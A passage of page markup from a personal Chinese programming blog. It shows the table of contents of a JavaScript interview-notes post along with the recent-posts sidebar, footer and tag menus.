href="#10%E3%80%81Document-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.10.</span> <span class="toc-text">10、Document 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Document-%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-number">1.10.1.</span> <span class="toc-text">Document 对象属性和方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%E3%80%81JS%E4%B8%AD%E9%98%BB%E6%AD%A2%E5%86%92%E6%B3%A1%E4%BA%8B%E4%BB%B6"><span class="toc-number">1.11.</span> <span class="toc-text">11、JS中阻止冒泡事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12%E3%80%81%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6"><span class="toc-number">1.12.</span> <span class="toc-text">12、阻止默认事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13%E3%80%81window-location"><span class="toc-number">1.13.</span> <span class="toc-text">13、window.location</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Location-%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7"><span class="toc-number">1.13.1.</span> <span class="toc-text">Location 对象属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Location-%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.13.2.</span> <span class="toc-text">Location 对象方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14%E3%80%81%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.14.</span> <span class="toc-text">14、原型与原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B-prototype"><span class="toc-number">1.14.1.</span> <span class="toc-text">原型 prototype</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%EF%BC%9A-proto"><span class="toc-number">1.14.2.</span> <span class="toc-text">原型链：_proto_</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">1.15.</span> <span class="toc-text">预编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15%E3%80%81this"><span class="toc-number">1.16.</span> <span class="toc-text">15、this</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8"><span class="toc-number">1.16.1.</span> <span class="toc-text">函数直接调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.16.2.</span> <span class="toc-text">对象方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.16.3.</span> <span class="toc-text">案例：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E4%B8%ADthis"><span class="toc-number">1.16.4.</span> <span class="toc-text">箭头函数中this</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#this%E6%8C%87%E5%90%91%EF%BC%88%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0%E3%80%81%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%EF%BC%89"><span class="toc-number">1.16.5.</span> <span class="toc-text">this指向（普通函数、箭头函数）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16%E3%80%81%E9%97%AD%E5%8C%85"><span class="toc-number">1.17.</span> <span class="toc-text">16、闭包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%A2%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.17.1.</span> <span class="toc-text">形式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%84%8F%E4%B9%89%EF%BC%9A"><span class="toc-number">1.17.2.</span> <span class="toc-text">意义：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17%E3%80%81ES6"><span class="toc-number">1.18.</span> <span class="toc-text">17、ES6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#var-let-const"><span class="toc-number">1.18.1.</span> <span class="toc-text">var let const</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#var"><span class="toc-number">1.18.1.1.</span> <span class="toc-text">var:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#const"><span class="toc-number">1.18.1.2.</span> <span class="toc-text">const:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%84"><span class="toc-number">1.18.2.</span> <span class="toc-text">解构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%BB%E9%87%8D"><span class="toc-number">1.18.3.</span> <span class="toc-text">去重</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#promise"><span class="toc-number">1.18.4.</span> <span class="toc-text">promise</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18%E3%80%81xss"><span class="toc-number">1.19.</span> <span class="toc-text">18、xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19%E3%80%81SEO"><span class="toc-number">1.20.</span> <span class="toc-text">19、SEO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20%E3%80%81%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D"><span class="toc-number">1.21.</span> <span class="toc-text">20、数组去重</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E4%BC%AA%E6%95%B0%E7%BB%84%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.22.</span> <span class="toc-text">21、数组和伪数组的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22%E3%80%81%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85"><span class="toc-number">1.23.</span> <span class="toc-text">22、手写一个发布订阅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23%E3%80%81%E4%BB%8B%E7%BB%8D%E4%B8%8B-Set%E3%80%81Map%E3%80%81WeakSet-%E5%92%8C-WeakMap-%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">1.24.</span> <span class="toc-text">23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24%E3%80%81%E7%AE%80%E5%8D%95%E8%AF%B4%E8%AF%B4-js-%E4%B8%AD%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">1.25.</span> <span class="toc-text">24、简单说说 js 中有哪几种内存泄露的情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25%E3%80%81json%E5%92%8Cxml%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.26.</span> <span class="toc-text">25、json和xml数据的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26%E3%80%81JavaScript%E6%9C%89%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A4%E6%96%AD%E5%8F%98%E9%87%8F%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.27.</span> <span class="toc-text">26、JavaScript有几种方法判断变量的类型?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27%E3%80%81Math"><span class="toc-number">1.28.</span> <span class="toc-text">27、Math</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Math-%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.28.1.</span> <span class="toc-text">Math 对象方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28%E3%80%81promise%E5%92%8C-async-await-%E5%8C%BA%E5%88%AB"><span class="toc-number">1.29.</span> <span class="toc-text">28、promise和 async await 区别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%A4%E8%80%85%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.29.0.1.</span> <span class="toc-text">两者的区别</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29%E3%80%81-defer%E5%92%8Casync%E5%8C%BA%E5%88%AB"><span class="toc-number">1.30.</span> <span class="toc-text">29、 defer和async区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#30%E3%80%81%E5%90%8C%E6%AD%A5%E5%92%8C%E5%BC%82%E6%AD%A5"><span class="toc-number">1.31.</span> <span class="toc-text">30、同步和异步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#31%E3%80%81-%E5%AE%9E%E7%8E%B0%E5%BC%82%E6%AD%A5%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.32.</span> <span class="toc-text">31、 实现异步的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E3%80%81-promise%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="toc-number">1.33.</span> <span class="toc-text">32、 promise的介绍与使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33%E3%80%81%E7%94%A8js%E5%AE%9E%E7%8E%B0sleep%EF%BC%8C%E7%94%A8promise"><span class="toc-number">1.34.</span> <span class="toc-text">33、用js实现sleep，用promise</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34%E3%80%81js%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E6%B6%89%E5%8F%8A%E5%88%B0settimeout%E3%80%81console%E3%80%81process-nextTick%E3%80%81promise-then"><span class="toc-number">1.35.</span> <span class="toc-text">34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35%E3%80%81call-appy-bind%E7%9A%84%E4%BD%9C%E7%94%A8%E5%92%8C%E5%8C%BA%E5%88%AB"><span class="toc-number">1.36.</span> <span class="toc-text">35、call appy bind的作用和区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%86%99bind"><span class="toc-number">1.36.1.</span> <span class="toc-text">手写bind</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%86%99call"><span class="toc-number">1.36.2.</span> <span class="toc-text">手写call</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%86%99apply"><span class="toc-number">1.36.3.</span> <span class="toc-text">手写apply</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36%E3%80%81%E7%BB%A7%E6%89%BF%EF%BC%8C%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">1.37.</span> <span class="toc-text">36、继承，优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37%E3%80%81ES5-js%E7%BB%A7%E6%89%BF%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">1.38.</span> <span class="toc-text">37、ES5 js继承的方法和优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38%E3%80%81ES6%E7%BB%A7%E6%89%BF"><span class="toc-number">1.39.</span> <span class="toc-text">38、ES6继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#39%E3%80%81%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C%E7%AC%A6%E2%80%A6"><span class="toc-number">1.40.</span> <span class="toc-text">39、扩展操作符…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#40%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88js%E6%98%AF%E5%8D%95%E7%BA%BF%E7%A8%8B"><span class="toc-number">1.41.</span> <span class="toc-text">40、为什么js是单线程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#41%E3%80%81%E6%AD%BB%E9%94%81"><span class="toc-number">1.42.</span> <span class="toc-text">41、死锁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42%E3%80%81%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%B8%89%E4%B8%AA%E7%89%B9%E5%BE%81%EF%BC%8C%E5%88%86%E5%88%AB%E8%AF%B4%E4%B8%80%E4%B8%8B%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D"><span class="toc-number">1.43.</span> <span class="toc-text">42、面向对象的三个特征，分别说一下什么意思</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43%E3%80%81%E9%98%B2%E6%8A%96%E5%92%8C%E8%8A%82%E6%B5%81%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.44.</span> <span class="toc-text">43、防抖和节流的原理和使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44%E3%80%81%E6%96%87%E4%BB%B6%E5%BC%82%E6%AD%A5%E4%B8%8A%E4%BC%A0%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.45.</span> <span class="toc-text">44、文件异步上传怎么实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%99%AE%E9%80%9A%E8%A1%A8%E5%8D%95%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.45.1.</span> <span class="toc-text">1.普通表单上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E7%BC%96%E7%A0%81%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.45.2.</span> <span class="toc-text">2.文件编码上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-formData%E5%BC%82%E6%AD%A5%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.45.3.</span> <span class="toc-text">3.formData异步上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-iframe%E6%97%A0%E5%88%B7%E6%96%B0%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.45.4.</span> <span class="toc-text">4.iframe无刷新页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#parent%EF%BC%8C%E5%9C%A8%E7%88%B6%E7%AA%97%E5%8F%A3%E6%89%93%E5%BC%80"><span class="toc-number">1.45.5.</span> <span class="toc-text">_parent，在父窗口打开</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#45%E3%80%81%E4%BD%BF%E7%94%A8setInterval%E8%AF%B7%E6%B1%82%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%94%E5%9B%9E%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3"><span class="toc-number">1.46.</span> <span class="toc-text">45、使用setInterval请求实时数据，返回顺序不一致怎么解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#46%E3%80%81%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%8C%E6%B7%B1%E6%8B%B7%E8%B4%9D-%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F"><span class="toc-number">1.47.</span> <span class="toc-text">46、浅拷贝，深拷贝(实现方式)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#47%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2url"><span class="toc-number">1.48.</span> <span class="toc-text">47、获取当前页面url</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#48%E3%80%81js%E4%B8%AD%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E6%80%8E%E4%B9%88%E5%8F%96%E4%BA%A4%E9%9B%86-%E5%B7%AE%E9%9B%86%E3%80%81%E5%B9%B6%E9%9B%86%E3%80%81%E8%A1%A5%E9%9B%86"><span class="toc-number">1.49.</span> <span class="toc-text">48、js中两个数组怎么取交集+(差集、并集、补集)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ES5%EF%BC%9A"><span class="toc-number">1.49.1.</span> <span class="toc-text">ES5：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ES6%EF%BC%9A"><span class="toc-number">1.49.2.</span> <span class="toc-text">ES6：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#49%E3%80%81%E6%B2%99%E7%AE%B1%E9%9A%94%E7%A6%BB%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%E4%BB%80%E4%B9%88%E5%8E%9F%E7%90%86"><span class="toc-number">1.50.</span> <span class="toc-text">49、沙箱隔离怎么做的什么原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53%E3%80%81%E9%97%AD%E5%8C%85%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">1.51.</span> <span class="toc-text">53、闭包的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E5%BA%94%E7%94%A8%E7%AF%87"><span class="toc-number">1.52.</span> <span class="toc-text">JS应用篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D%E9%80%86%E5%BA%8F%E8%BE%93%E5%87%BA%EF%BC%88%E6%89%8B%E5%86%99%EF%BC%89"><span class="toc-number">1.52.1.</span> <span class="toc-text">字符串中的单词逆序输出（手写）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#function-rand-min-max-N-%EF%BC%9A%E7%94%9F%E6%88%90%E9%95%BF%E5%BA%A6%E6%98%AFN%EF%BC%8C%E4%B8%94%E5%9C%A8min%E3%80%81max%E5%86%85%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B4%E6%95%B0%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%84"><span class="toc-number">1.52.2.</span> <span class="toc-text">function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Math-random"><span class="toc-number">1.52.3.</span> <span class="toc-text">Math.random</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%95%B0%E7%BB%84%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%BB%E9%87%8D%EF%BC%8C%E7%9B%B8%E5%90%8Cvalue%E7%9A%84%E5%8F%AA%E4%BF%9D%E7%95%99%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%EF%BC%8C%E6%9C%80%E5%A5%BD%E6%9C%89%E5%A4%9A%E4%B8%AA%E6%80%9D%E8%B7%AF"><span class="toc-number">1.52.4.</span> <span class="toc-text">实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E5%85%A5-1-2-3-4-5-%EF%BC%8C%E8%BF%94%E5%9B%9E-1-2-3-4-5"><span class="toc-number">1.52.5.</span> <span class="toc-text">传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%AD%A3%E5%88%99%E5%92%8C%E9%9D%9E%E6%AD%A3%E5%88%99%E5%AE%9E%E7%8E%B012345678-12-x3D-%E3%80%8B12%EF%BC%8C345%EF%BC%8C678-12"><span class="toc-number">1.52.6.</span> <span class="toc-text">用正则和非正则实现12345678.12&#x3D;》12，345，678.12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E4%B8%AA%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E7%A9%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.52.7.</span> <span class="toc-text">写一个判断是否是空对象的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E8%AF%B7%E4%BD%A0%E6%89%BE%E5%87%BA%E5%85%B6%E4%B8%AD%E4%B8%8D%E5%90%AB%E6%9C%89%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84-%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2-%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">1.52.8.</span> <span class="toc-text">给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C"><span class="toc-number">1.52.9.</span> <span class="toc-text">三数之和</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.52.10.</span> <span class="toc-text">js判断数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#arr-flat-Infinity"><span class="toc-number">1.52.11.</span> <span class="toc-text">arr.flat(Infinity)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/a34e.html" title="使用WebAssembly优化性能问题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kiftravel.oss-cn-beijing.aliyuncs.com/img/202309021720156.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="使用WebAssembly优化性能问题"/></a><div class="content"><a class="title" href="/post/a34e.html" title="使用WebAssembly优化性能问题">使用WebAssembly优化性能问题</a><time datetime="2023-09-02T05:47:00.000Z" title="发表于 2023-09-02 13:47:00">2023-09-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/kif1.html" title="Math.toFixed中的四舍五入问题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kiftravel.oss-cn-beijing.aliyuncs.com/img/202308280943672.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Math.toFixed中的四舍五入问题"/></a><div class="content"><a class="title" href="/post/kif1.html" title="Math.toFixed中的四舍五入问题">Math.toFixed中的四舍五入问题</a><time datetime="2023-08-28T03:09:00.000Z" title="发表于 2023-08-28 11:09:00">2023-08-28</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/post/8a59.html" title="React系列：Rematch">React系列：Rematch</a><time datetime="2023-08-05T03:31:00.000Z" title="发表于 2023-08-05 11:31:00">2023-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/9aee.html" title="kif的neovim设置"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/img/202304191059908.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kif的neovim设置"/></a><div class="content"><a class="title" href="/post/9aee.html" title="kif的neovim设置">kif的neovim设置</a><time datetime="2023-04-19T02:58:00.000Z" title="发表于 2023-04-19 10:58:00">2023-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/5fbb.html" title="win11中powershell设置v2ray代理"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/img/202304191057671.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="win11中powershell设置v2ray代理"/></a><div class="content"><a class="title" href="/post/5fbb.html" title="win11中powershell设置v2ray代理">win11中powershell设置v2ray代理</a><time datetime="2023-04-19T02:54:00.000Z" title="发表于 2023-04-19 10:54:00">2023-04-19</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2023 By <a class="footer-bar-link" href="/" title="kif" target="_blank">kif</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">17</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.kifroom.icu/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/ico.png" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://kifnav.kifroom.icu/" title="kifNav"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifnav.kifroom.icu/favicon.ico" alt="kifNav"/><span class="back-menu-item-text">kifNav</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/links/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/message-board/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Axios/" style="font-size: 0.88rem;">Axios<sup>3</sup></a><a href="/tags/C-S-N/" style="font-size: 0.88rem;">C.S.N<sup>1</sup></a><a href="/tags/Ckeditor4/" style="font-size: 0.88rem;">Ckeditor4<sup>1</sup></a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">C语言<sup>3</sup></a><a href="/tags/Django/" style="font-size: 0.88rem;">Django<sup>1</sup></a><a href="/tags/Excel/" style="font-size: 0.88rem;">Excel<sup>1</sup></a><a href="/tags/Oracle/" style="font-size: 0.88rem;">Oracle<sup>1</sup></a><a href="/tags/Python/" style="font-size: 0.88rem;">Python<sup>1</sup></a><a href="/tags/RSA/" style="font-size: 0.88rem;">RSA<sup>1</sup></a><a href="/tags/SQL/" style="font-size: 0.88rem;">SQL<sup>1</sup></a><a href="/tags/VS-code/" style="font-size: 0.88rem;">VS code<sup>1</sup></a><a href="/tags/Vue-js/" style="font-size: 0.88rem;">Vue.js<sup>2</sup></a><a href="/tags/Win/" style="font-size: 0.88rem;">Win<sup>3</sup></a><a href="/tags/dom-to-image/" style="font-size: 0.88rem;">dom-to-image<sup>1</sup></a><a href="/tags/express/" 